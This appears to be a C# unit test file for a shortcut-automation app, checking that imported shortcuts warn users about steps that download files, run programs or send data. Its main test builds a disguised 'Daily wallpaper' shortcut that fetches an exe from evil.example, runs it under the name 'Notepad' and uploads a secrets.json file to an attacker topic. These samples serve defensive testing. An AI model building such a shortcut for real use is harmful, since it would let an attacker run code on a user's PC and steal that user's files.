using Flowmate.Core;
using Flowmate.Core.Testing;
using Xunit;

namespace Flowmate.Core.Tests;

public class ImportRiskTests
{
    private sealed class Fake : ShortcutAction
    {
        private readonly ActionDescriptor _d;
        public Fake(ActionDescriptor d) => _d = d;
        public override ActionDescriptor Descriptor => _d;
        public override Task<ContentValue> RunAsync(ActionContext ctx) => Task.FromResult(ContentValue.Empty);
    }

    private static ActionRegistry Registry()
    {
        var reg = new ActionRegistry();
        reg.Register(new Fake(new ActionDescriptor { Id = "t.run", Title = "Run Thing", Category = "Test", IsAdvanced = true, ImportRisk = ImportRisk.RunsPrograms }));
        reg.Register(new Fake(new ActionDescriptor { Id = "t.get", Title = "Get Thing", Category = "Test", ImportRisk = ImportRisk.DownloadsFiles }));
        reg.Register(new Fake(new ActionDescriptor
        {
            Id = "t.post", Title = "Post Thing", Category = "Test",
            ImportRiskFor = a => a.Parameters.GetValueOrDefault("bodyType") is ChoiceValue { Value: "file" } ? ImportRisk.SendsData : ImportRisk.None,
        }));
        reg.Register(new Fake(new ActionDescriptor { Id = "share.phone", Title = "Send to My Phone", Category = "Test", ImportRisk = ImportRisk.SendsData }));
        reg.Register(new Fake(new ActionDescriptor { Id = "t.plain", Title = "Plain", Category = "Test" }));
        reg.Register(new Fake(new ActionDescriptor { Id = "t.adv", Title = "Advanced Thing", Category = "Test", IsAdvanced = true }));
        return reg;
    }

    [Fact]
    public void Risky_steps_are_listed_in_plain_words()
    {
        var b = new ShortcutBuilder("Daily wallpaper");
        b.Add("t.plain");
        b.Add("t.get", ("url", ParamValue.Text("https://evil.example/x.exe")));
        b.Add("t.run", ("app", ParamValue.App(@"C:\Users\Public\x.exe", "Notepad")));
        b.Add("t.post", ("bodyType", ParamValue.Choice("file")), ("bodyFile", ParamValue.File(@"C:\Users\me\AppData\Roaming\secrets.json")));
        b.Add("t.post", ("bodyType", ParamValue.Choice("none")));
        b.Add("share.phone", ("topic", ParamValue.Text("attacker-topic")));
        b.Add("t.adv");
        var warnings = ShortcutPackage.Inspect(b.Build(), Registry());

        Assert.Equal(new[] { ImportWarningKind.DownloadsFiles, ImportWarningKind.RunsPrograms, ImportWarningKind.SendsData, ImportWarningKind.SendsData, ImportWarningKind.Advanced },
            warnings.Select(w => w.Kind));
        var text = warnings.Select(w => w.Describe()).ToList();
        Assert.Equal("Get Thing: evil.example (downloads files from the internet)", text[0]);
        // The real program path is shown, not just the friendly name, and the Advanced note isn't repeated for it.
        Assert.Equal(@"Run Thing: C:\Users\Public\x.exe (runs a command, or opens a program or file)", text[1]);
        Assert.Equal(@"Post Thing: C:\Users\me\AppData\Roaming\secrets.json (sends your files or data off this PC)", text[2]);
        Assert.Equal("Send to My Phone: attacker-topic (sends your files or data off this PC)", text[3]);
        Assert.Equal("Advanced Thing (an advanced step)", text[4]);
    }

    [Fact]
    public void Importing_a_shortcut_with_only_a_download_asks_first()
    {
        var b = new ShortcutBuilder("Get it");
        b.Add("t.get", ("url", ParamValue.Text("https://example.com/a.zip")));
        var lib = new InMemoryShortcutLibrary(Registry());
        var result = lib.ImportJson(ShortcutPackage.Serialize(b.Build()));
        Assert.True(result.NeedsConfirmation);
    }

    [Fact]
    public void App_display_text_shows_the_real_target()
    {
        Assert.Equal(@"Notepad (C:\Users\Public\x.exe)", new AppValue(@"C:\Users\Public\x.exe", "Notepad").DisplayText);
        Assert.Equal(@"Notepad (\\server\share\x.exe)", new AppValue(@"\\server\share\x.exe", "Notepad").DisplayText);
        var system = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe");
        Assert.Equal("Notepad", new AppValue(system, "Notepad").DisplayText);
        Assert.Equal(@"Notepad (C:\Windows\..\Users\Public\x.exe)", new AppValue(@"C:\Windows\..\Users\Public\x.exe", "Notepad").DisplayText);
        Assert.Equal("Calculator", new AppValue("Microsoft.WindowsCalculator_8wekyb3d8bbwe!App", "Calculator").DisplayText);
        Assert.Equal("notepad", new AppValue("notepad").DisplayText);
    }
}
